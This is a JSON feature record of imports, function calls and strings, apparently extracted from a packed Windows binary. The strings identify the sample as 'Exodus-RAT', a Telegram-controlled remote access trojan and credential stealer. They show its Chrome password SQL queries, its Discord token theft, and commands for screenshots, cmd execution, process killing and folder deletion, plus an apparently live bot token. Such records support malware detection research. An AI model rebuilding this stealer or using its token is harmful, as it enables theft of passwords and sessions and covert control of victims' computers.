{
    "imports": [
        "LibraryLoader",
        "ssl",
        "_frozen_importlib",
        "sys",
        "struct",
        "popen_spawn_win32",
        "multiprocessing",
        "warnings",
        "listdir",
        "forking",
        "os",
        "ctypes",
        "win32com.gen_py",
        "win32crypt",
        "tempfile",
        "dyld",
        "encodings",
        "platform",
        "environ",
        "re",
        "shutil",
        "subprocess",
        "telebot",
        "popen_fork",
        "requests",
        "_clearcache",
        "imp",
        "pkg_resources",
        "win32com",
        "atexit",
        "pyimod00_crypto_key",
        "marshal",
        "FrozenImporter",
        "PIL",
        "zlib",
        "DEFAULT_MODE",
        "*",
        "webbrowser",
        "_thread",
        "ImageGrab",
        "thread",
        "sqlite3",
        "__doc__",
        "_args_from_interpreter_flags",
        "pyimod03_importers",
        "spawn"
    ],
    "function_calls": [
        "__create_cipher",
        "list",
        "write",
        "fileno",
        "rfind",
        "discord_token",
        "isabs",
        "seek",
        "_import_aesmod",
        "range",
        "chdir",
        "os_listdir",
        "new",
        "_args_from_interpreter_flags",
        "os_path_dirname",
        "tell",
        "format",
        "execute",
        "processor",
        "post",
        "ArchiveFile",
        "checkmagic",
        "type",
        "TeleBot",
        "unpack",
        "listdir",
        "getcwd",
        "exists",
        "os_path_basename",
        "copy2",
        "decode",
        "exec",
        "message_handler",
        "polling",
        "getlogin",
        "str",
        "mkdtemp",
        "get_default_verify_paths",
        "keys",
        "decrypt",
        "close",
        "register",
        "open",
        "LibraryLoader",
        "int",
        "local",
        "makedirs",
        "loads",
        "ArchiveReadError",
        "startswith",
        "call",
        "save",
        "isdir",
        "abspath",
        "getenv",
        "_frozen_name",
        "open_new_tab",
        "set",
        "exit",
        "zfill",
        "read",
        "append",
        "isfile",
        "basename",
        "Popen",
        "loadtoc",
        "fetchall",
        "Chrome",
        "__init__",
        "split",
        "dict",
        "insert",
        "FileNotFoundError",
        "removedirs",
        "get_magic",
        "get_ident",
        "ImportError",
        "join",
        "putenv",
        "hasattr",
        "Cipher",
        "register_loader_type",
        "platform",
        "decompress",
        "cursor",
        "get",
        "install",
        "send_message",
        "len",
        "super",
        "NullWriter",
        "connect",
        "grab",
        "CryptUnprotectData",
        "FilePos"
    ],
    "strings": [
        "",
        "iter_unpack",
        "\nLOGIN: ",
        "Failed to load dynlib/dll %r. Most probably this dynlib/dll was not found when the application was frozen.",
        "\u0414\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f ",
        "Help",
        "\u0414\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0430 \u043d\u0430 ",
        "!i",
        "\nSet up 'os' and 'os.path' module replacement functions for use during import\nbootstrap.\n",
        "get_discord",
        "Stealer coded by @darkside_team\n\n\nPasswords Chrome:\n",
        "Not found",
        "open_url",
        "\u041e\u0448\u0438\u0431\u043a\u0430! \u0411\u0440\u0430\u0443\u0437\u0435\u0440 \u0437\u0430\u043f\u0443\u0449\u0435\u043d!",
        "879793515:AAEVrYbvCmtDttBj2dvq9nlZ27M1-zha3HA",
        "calcsize",
        "\n    This class keeps track of the file object representing and current position\n    in a file.\n    ",
        "Wait...",
        "/sendDocument?chat_id=",
        "w+",
        "/sendPhoto?chat_id=",
        " ",
        "VIRTUAL_ENV",
        "/discord/Local Storage/https_discordapp.com_0.localstorage",
        "http://ip.42.pl/raw",
        "\u0413\u043e\u0442\u043e\u0432\u043e!",
        "Struct",
        "\n        Open file and seek to pos record from last close.\n        ",
        "\u0422\u0435\u043a\u0443\u0449\u0430\u044f \u0434\u0435\u0440\u0438\u043a\u0442\u043e\u0440\u0438\u044f: \n",
        "\n    A base class for a repository of python code objects.\n    The extract method is used by imputil.ArchiveImporter\n    to get code objects by name (fully qualified name), so\n    an enduser \"import a.b\" would become\n      extract('a.__init__')\n      extract('a.b')\n    ",
        "help",
        "passwords",
        "path",
        "\nOS: ",
        "tk",
        "SSL_CERT_FILE",
        "photo",
        "cacert.pem",
        "document",
        "Get_discord",
        "\nProcessor: ",
        "\\",
        "/\\",
        "Files: \n",
        "from multiprocessing.forkserver import main",
        "\n        Return a list of the contents\n        Default implementation assumes self.toc is a dict like object.\n        Not required by ArchiveImporter.\n        ",
        "Download",
        "\nIP: ",
        "unpack",
        "\\Google\\Chrome\\User Data\\Default\\Login Data",
        "Passwords",
        "LOCALAPPDATA",
        "pack_into",
        "Pwd",
        "Crypto.Cipher._AES",
        "PYZ entry '%s' failed to unmarshal",
        "APPDATA",
        "eggs",
        "Info",
        "Open_url",
        "\\passwords_chrome.txt",
        "nt",
        "%s has version mismatch to dll",
        "About",
        "%s is not a valid %s archive file",
        "{0}",
        "posix",
        "\n        Return an instance of FilePos for the current thread. This is a crude\n        # re-implementation of threading.local, which isn't a built-in module\n        # and therefore isn't available.\n        ",
        "win",
        "TK_LIBRARY",
        "475441085",
        "certifi",
        "\u2623 Exodus-RAT v 1.0 \u2623 \n\nCoder: @exploit_dar \nSpecial for @darkside_team <3",
        "Commands",
        "screen",
        "\n    This class is used only to decrypt Python modules.\n    ",
        "Start",
        "download",
        "pwd",
        "-c",
        "darwin",
        "ignore_errors",
        "\n    ZlibArchive - an archive with compressed entries. Archive is read\n    from the executable created by PyInstaller.\n\n    This archive is used for bundling python modules inside the executable.\n\n    NOTE: The whole ZlibArchive (PYZ) is compressed so it is not necessary\n          to compress single modules with zlib.\n    ",
        "__loader__",
        "unpack_from",
        ":",
        "kill_process",
        "cd",
        "\\Google\\Chrome\\User Data\\Default\\Login Data2",
        "\n        Tries to import the AES module from PyCrypto.\n\n        PyCrypto 2.4 and 2.6 uses different name of the AES extension.\n        ",
        "\nURL: ",
        "files",
        "Tk data directory \"%s\" not found.",
        "tcl",
        "\n        Overridable.\n        Default: After magic comes an int (4 byte native) giving the\n        position of the TOC within self.lib.\n        Default: The TOC is a marshal-able string.\n        ",
        "Discord token:\n",
        " \u0443\u0434\u0430\u043b\u0435\u043d\u0430",
        "cmd",
        "start",
        "https://api.telegram.org/bot",
        "No os specific module found",
        "\\Sreenshot.jpg",
        "?",
        "Tcl data directory \"%s\" not found.",
        "pack",
        "gen_py",
        "SELECT key, value FROM ItemTable WHERE key='token'",
        "\u2623 Exodus-RAT Running \u2623\n\n\u0427\u0442\u043e\u0431\u044b \u0443\u0437\u043d\u0430\u0442\u044c \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u0432\u0432\u0435\u0434\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u0443 /commands\nCoded by 3xpl01t | @darkside_team",
        "\n    File class support auto open when access member from file object\n    This class is use to avoid file locking on windows\n    ",
        "/passwords chrome",
        "\n        Get the object corresponding to name, or None.\n        For use with imputil ArchiveImporter, object is a python code object.\n        'name' is the name as specified in an 'import name'.\n        'import a.b' will become:\n        extract('a') (return None because 'a' is not a code object)\n        extract('a.__init__') (return a code object)\n        extract('a.b') (return a code object)\n        Default implementation:\n          self.toc is a dict\n          self.toc[name] is pos\n          self.lib has the code object marshal-ed at pos\n        ",
        "UTF-8",
        "\n        Make this class act like a file, by invoking most methods on its\n        underlying file object.\n        ",
        "frozen",
        "Cmd",
        "Rm_dir",
        "TCL_LIBRARY",
        "_MEIPASS2",
        "rm_dir",
        "\nPASSWORD: ",
        "commands",
        "\n        Overridable.\n        Check to see if the file object self.lib actually has a file\n        we understand.\n        ",
        "ls",
        "\n        Close file and record pos.\n        ",
        "Ls",
        "\u041a\u043e\u043c\u0430\u043d\u0434\u044b: \n /Screen - \u0421\u043a\u0440\u0438\u043d\u0448\u043e\u0442 \u044d\u043a\u0440\u0430\u043d\u0430 \n /Info - \u0418\u043d\u0444\u043e \u043e \u044e\u0437\u0435\u0440\u0435 \n /kill_process name.exe - \u0423\u0431\u0438\u0442\u044c \u043f\u0440\u043e\u0446\u0435\u0441\u0441 \u043f\u043e \u0438\u043c\u0435\u043d\u0438\n /Pwd - \u0423\u0437\u043d\u0430\u0442\u044c \u0442\u0435\u043a\u0443\u0449\u0443\u044e \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044e \n /passwords chrome - \u041f\u0430\u0440\u043e\u043b\u0438 \u0433\u0443\u0433\u043b \u0445\u0440\u043e\u043c \n /passwords opera - \u041f\u0430\u0440\u043e\u043b\u0438 \u043e\u043f\u0435\u0440\u0430\n /Get_discord - \u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0442\u043e\u043a\u0435\u043d \u0441\u0435\u0441\u0441\u0438\u0438 Discord\n /Cmd command - \u0412\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u043a\u043e\u043c\u0430\u043d\u0434\u0443 \u0432 cmd  \n /Open_url - \u041e\u0442\u043a\u0440\u044b\u0442\u044c \u0441\u0441\u044b\u043b\u043a\u0443 \n /Ls - \u0432\u0441\u0435 \u043f\u0430\u043f\u043a\u0438 \u0438 \u0444\u0430\u0439\u043b\u044b \u0432 \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u0438\n /Cd folder - \u043f\u0435\u0440\u0435\u0439\u0442\u0438 \u0432 \u043f\u0430\u043f\u043a\u0443 \n /Download - \u0441\u043a\u0430\u0447\u0430\u0442\u044c \u0444\u0430\u0439\u043b \n /Rm_dir - \u0443\u0434\u0430\u043b\u0438\u0442\u044c \u043f\u0430\u043f\u043a\u0443\n\n /About - \u043e RAT'e",
        "about",
        "SELECT action_url, username_value, password_value FROM logins",
        "Kill_process",
        "PYTHONCASEOK",
        "\n        Initialize an Archive. If path is omitted, it will be an empty Archive.\n        ",
        "from multiprocessing.semaphore_tracker import main",
        ".",
        "info",
        "error",
        "Cd",
        "\n",
        "utf-16",
        "C:\\\\Windows\\\\system32\\\\cmd.exe",
        "taskkill /IM ",
        "Screen",
        "rb",
        "PC: ",
        "/"
    ]
}